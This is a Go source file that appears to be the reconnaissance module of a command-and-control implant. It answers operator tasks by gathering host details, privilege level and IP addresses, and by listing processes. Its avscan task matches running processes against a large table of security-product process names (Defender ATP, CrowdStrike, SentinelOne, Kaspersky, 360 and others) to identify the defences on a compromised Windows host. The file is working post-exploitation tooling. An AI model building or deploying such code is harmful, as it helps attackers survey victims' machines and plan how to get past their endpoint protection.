package main

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
)

// ProcessInfo 表示一个简化后的进程视图，用于信息收集与杀软识别。
type ProcessInfo struct {
	Name    string `json:"name"`
	PID     int    `json:"pid"`
	PPID    int    `json:"ppid,omitempty"`
	User    string `json:"user,omitempty"`
	Command string `json:"command,omitempty"`
}

// SecurityProductDetection 表示命中的安全产品及对应进程列表。
type SecurityProductDetection struct {
	Product   string   `json:"product"`
	Processes []string `json:"processes"`
}

var avProcessSignatures = map[string][]string{
	"Windows Defender ATP":         {"MsSense.exe", "SenseCncProxy.exe", "SenseIR.exe", "SenseNdr.exe", "SenseSC.exe"},
	"Windows Defender SmartScreen": {"smartscreen.exe"},
	"CrowdStrike Falcon(猎鹰)":       {"csfalconservice.exe", "CSFalconContainer.exe"},
	"SentinelOne(哨兵一号)":            {"SentinelServiceHost.exe", "SentinelStaticEngine.exe", "SentinelStaticEngineScanner.exe", "SentinelMemoryScanner.exe", "SentinelAgent.exe", "SentinelAgentWorker.exe", "SentinelUI.exe"},
	"Sophos":                       {"SavProgress.exe", "icmon.exe", "SavMain.exe", "SophosUI.exe", "SophosFS.exe", "SophosHealth.exe", "SophosSafestore64.exe", "SophosCleanM.exe", "SophosFileScanner.exe", "SophosNtpService.exe", "SophosOsquery.exe", "Sophos UI.exe"},
	"ESET-NOD32":                   {"egui.exe", "ecls.exe", "ekrn.exe", "eguiProxy.exe", "EShaSrv.exe"},
	"Qihoo-360":                    {"360sd.exe", "360tray.exe", "ZhuDongFangYu.exe", "360rp.exe", "360rps.exe", "360safe.exe", "360safebox.exe", "QHActiveDefense.exe", "360skylarsvc.exe", "LiveUpdate360.exe"},
	"火绒安全":                         {"hipstray.exe", "wsctrl.exe", "usysdiag.exe", "HipsDaemon.exe", "HipsLog.exe", "HipsMain.exe", "wsctrlsvc.exe"},
	"Kaspersky(卡巴斯基)":              {"avp.exe", "avpcc.exe", "avpm.exe", "kavpf.exe", "kavfs.exe", "klnagent.exe", "kavtray.exe", "kavfswp.exe", "kaspersky.exe"},
	"Trellix/McAfee":               {"Mcshield.exe", "Tbmon.exe", "Frameworkservice.exe", "firesvc.exe", "firetray.exe", "hipsvc.exe", "mfevtps.exe", "mcafeefire.exe", "shstat.exe", "vstskmgr.exe", "engineserver.exe", "alogserv.exe", "avconsol.exe", "cmgrdian.exe", "cpd.exe", "mcmnhdlr.exe", "mcvsshld.exe", "mcvsrte.exe", "mghtml.exe", "mpfservice.exe", "mpfagent.exe", "mpftray.exe", "vshwin32.exe", "vsstat.exe", "guarddog.exe", "mfeann.exe", "udaterui.exe", "naprdmgr.exe", "mctray.exe", "fcagate.exe", "fcag.exe", "fcags.exe", "fcagswd.exe", "macompatsvc.exe", "masvc.exe", "mcamnsvc.exe", "mctary.exe", "mfecanary.exe", "mfeconsole.exe", "mfeesp.exe", "mfefire.exe", "mfefw.exe", "mfemms.exe", "mfetp.exe", "mfewc.exe", "mfewch.exe"},
	"BitDefender":                  {"Bdagent.exe", "BitDefenderCom.exe", "vsserv.exe", "bdredline.exe", "secenter.exe", "bdservicehost.exe", "BITDEFENDER.exe"},
	"Avast":                        {"ashDisp.exe", "AvastUI.exe", "AvastSvc.exe", "AvastBrowser.exe", "AfwServ.exe"},
	"Elastic Security":             {"elastic-endpoint.exe", "elastic-agent.exe", "agentbeat.exe", "winlogbeat.exe"},
	"Trend Micro(趋势科技)":            {"tmpfw.exe", "tmlisten.exe", "coreServiceShell.exe", "coreFrameworkHost.exe", "uiWatchDog.exe", "TMLISTEN.exe"},
}

func executeSysinfo(task Task) TaskResponse {
	executable, _ := os.Executable()
	cwd, _ := os.Getwd()

	info := map[string]any{
		"hostname":        getHostname(),
		"user":            getCurrentUser(),
		"os":              runtime.GOOS,
		"arch":            runtime.GOARCH,
		"pid":             os.Getpid(),
		"ppid":            os.Getppid(),
		"ips":             getLocalIPs(),
		"cwd":             cwd,
		"executable":      executable,
		"integrity_level": getIntegrityLevel(),
		"is_elevated":     isElevated(),
		"process_name":    filepath.Base(os.Args[0]),
	}

	pretty, err := json.MarshalIndent(info, "", "  ")
	if err != nil {
		return TaskResponse{
			TaskID:     task.ID,
			UserOutput: "系统信息序列化失败: " + err.Error(),
			Completed:  true,
			Status:     "error: marshal failed",
		}
	}
	return TaskResponse{
		TaskID:     task.ID,
		UserOutput: string(pretty),
		Completed:  true,
		Status:     "success",
	}
}

func executeProcessList(task Task) TaskResponse {
	var params struct {
		Keyword string `json:"keyword"`
		Limit   int    `json:"limit"`
	}
	if err := json.Unmarshal([]byte(task.Parameters), &params); err != nil && strings.TrimSpace(task.Parameters) != "" {
		return TaskResponse{TaskID: task.ID, UserOutput: "参数解析失败: " + err.Error(), Completed: true, Status: "error: invalid parameters"}
	}

	processes, err := listProcesses()
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "获取进程列表失败: " + err.Error(), Completed: true, Status: "error: enumerate processes failed"}
	}

	keyword := strings.ToLower(strings.TrimSpace(params.Keyword))
	filtered := make([]ProcessInfo, 0, len(processes))
	for _, process := range processes {
		if keyword == "" || strings.Contains(strings.ToLower(process.Name), keyword) || strings.Contains(strings.ToLower(process.Command), keyword) {
			filtered = append(filtered, process)
		}
	}

	sort.Slice(filtered, func(i, j int) bool {
		if filtered[i].Name == filtered[j].Name {
			return filtered[i].PID < filtered[j].PID
		}
		return filtered[i].Name < filtered[j].Name
	})

	if params.Limit <= 0 {
		params.Limit = 60
	}
	if len(filtered) > params.Limit {
		filtered = filtered[:params.Limit]
	}

	var output strings.Builder
	output.WriteString("PID\tPPID\tUSER\tNAME\tCOMMAND\n")
	for _, process := range filtered {
		output.WriteString(fmt.Sprintf("%d\t%d\t%s\t%s\t%s\n", process.PID, process.PPID, normalizeEmpty(process.User), process.Name, normalizeEmpty(process.Command)))
	}
	if len(filtered) == 0 {
		output.WriteString("未找到匹配进程\n")
	}

	return TaskResponse{
		TaskID:     task.ID,
		UserOutput: output.String(),
		Completed:  true,
		Status:     "success",
	}
}

func executeAVScan(task Task) TaskResponse {
	if runtime.GOOS != "windows" {
		return TaskResponse{
			TaskID:     task.ID,
			UserOutput: "avscan 当前仅支持 Windows 目标",
			Completed:  true,
			Status:     "error: unsupported os",
		}
	}

	processes, err := listProcesses()
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "获取进程列表失败: " + err.Error(), Completed: true, Status: "error: enumerate processes failed"}
	}

	detections := detectSecurityProducts(processes)
	if len(detections) == 0 {
		return TaskResponse{
			TaskID:     task.ID,
			UserOutput: "未发现命中的安全产品进程",
			Completed:  true,
			Status:     "success",
		}
	}

	var output strings.Builder
	output.WriteString("命中的安全产品进程如下：\n")
	for _, detection := range detections {
		output.WriteString(fmt.Sprintf("- %s: %s\n", detection.Product, strings.Join(detection.Processes, ", ")))
	}
	output.WriteString("\n说明：该结果基于进程名特征匹配，特征集参考 Antivirus-Scan 项目并做了本地精简。")

	return TaskResponse{
		TaskID:     task.ID,
		UserOutput: output.String(),
		Completed:  true,
		Status:     "success",
	}
}

func listProcesses() ([]ProcessInfo, error) {
	if runtime.GOOS == "windows" {
		return listProcessesWindows()
	}
	return listProcessesUnix()
}

func listProcessesUnix() ([]ProcessInfo, error) {
	cmd := exec.Command("ps", "-axo", "pid=,ppid=,user=,comm=,args=")
	output, err := cmd.Output()
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(output), "\n")
	processes := make([]ProcessInfo, 0, len(lines))
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 4 {
			continue
		}
		pid, err := strconv.Atoi(fields[0])
		if err != nil {
			continue
		}
		ppid, _ := strconv.Atoi(fields[1])
		user := fields[2]
		name := fields[3]
		command := name
		if len(fields) > 4 {
			command = strings.Join(fields[4:], " ")
		}
		processes = append(processes, ProcessInfo{
			Name:    filepath.Base(name),
			PID:     pid,
			PPID:    ppid,
			User:    user,
			Command: command,
		})
	}
	return processes, nil
}

func listProcessesWindows() ([]ProcessInfo, error) {
	cmd := exec.Command("tasklist", "/fo", "csv", "/nh")
	output, err := cmd.Output()
	if err != nil {
		return nil, err
	}

	reader := csv.NewReader(strings.NewReader(string(output)))
	records, err := reader.ReadAll()
	if err != nil {
		return nil, err
	}

	processes := make([]ProcessInfo, 0, len(records))
	for _, record := range records {
		if len(record) < 2 {
			continue
		}
		pid, err := strconv.Atoi(strings.TrimSpace(record[1]))
		if err != nil {
			continue
		}
		name := strings.TrimSpace(record[0])
		processes = append(processes, ProcessInfo{
			Name: name,
			PID:  pid,
		})
	}
	return processes, nil
}

func detectSecurityProducts(processes []ProcessInfo) []SecurityProductDetection {
	processSet := make(map[string][]string)
	for _, process := range processes {
		name := strings.ToLower(strings.TrimSpace(process.Name))
		if name == "" {
			continue
		}
		processSet[name] = append(processSet[name], process.Name)
	}

	detections := make([]SecurityProductDetection, 0)
	for product, signatures := range avProcessSignatures {
		matched := make([]string, 0)
		seen := make(map[string]struct{})
		for _, signature := range signatures {
			for _, actualName := range processSet[strings.ToLower(signature)] {
				if _, exists := seen[actualName]; exists {
					continue
				}
				seen[actualName] = struct{}{}
				matched = append(matched, actualName)
			}
		}
		if len(matched) == 0 {
			continue
		}
		sort.Strings(matched)
		detections = append(detections, SecurityProductDetection{
			Product:   product,
			Processes: matched,
		})
	}
	sort.Slice(detections, func(i, j int) bool {
		return detections[i].Product < detections[j].Product
	})
	return detections
}

func isElevated() bool {
	if runtime.GOOS == "windows" {
		return getIntegrityLevel() >= 3
	}
	return os.Geteuid() == 0
}

func normalizeEmpty(value string) string {
	value = strings.TrimSpace(value)
	if value == "" {
		return "-"
	}
	return value
}
